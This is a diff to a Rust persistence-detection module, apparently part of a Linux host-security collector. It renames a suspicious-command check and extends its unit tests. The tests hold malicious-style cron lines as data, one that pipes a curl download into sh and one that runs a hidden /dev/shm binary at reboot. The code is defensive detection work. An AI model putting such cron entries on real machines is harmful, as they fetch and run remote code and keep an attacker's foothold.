@@ -77,7 +77,7 @@ fn collect_file(path: &Path, persistence_type: &str, events: &mut Vec<RawEvent>)
     let suspicious_lines = content
         .lines()
         .filter(|line| !line.trim_start().starts_with('#'))
-        .filter(|line| is_persistence_command_suspicious(line))
+        .filter(|line| is_persistence_command_candidate(line))
         .take(5)
         .collect::<Vec<_>>()
         .join("\n");
@@ -116,8 +116,8 @@ fn shell_profile_paths() -> Vec<PathBuf> {
     ]
 }
 
-/// Suspicious persistence command fragments common in VPS compromises.
-pub fn is_persistence_command_suspicious(line: &str) -> bool {
+/// Candidate persistence command fragments that deserve detector-side scoring.
+pub fn is_persistence_command_candidate(line: &str) -> bool {
     let lowered = line.to_ascii_lowercase();
     [
         "/tmp/",
@@ -139,15 +139,18 @@ pub fn is_persistence_command_suspicious(line: &str) -> bool {
 
 #[cfg(test)]
 mod tests {
-    use super::is_persistence_command_suspicious;
+    use super::is_persistence_command_candidate;
 
     #[test]
-    fn identifies_suspicious_cron_payloads() {
-        assert!(is_persistence_command_suspicious(
+    fn identifies_persistence_command_candidates() {
+        assert!(is_persistence_command_candidate(
             "* * * * * curl http://x | sh"
         ));
-        assert!(is_persistence_command_suspicious("@reboot /dev/shm/.x"));
-        assert!(!is_persistence_command_suspicious(
+        assert!(is_persistence_command_candidate("@reboot /dev/shm/.x"));
+        assert!(is_persistence_command_candidate(
+            "ExecStart=/bin/bash -c 'read args <&3; echo args=$args'"
+        ));
+        assert!(!is_persistence_command_candidate(
             "0 1 * * * /usr/bin/certbot renew"
         ));
     }
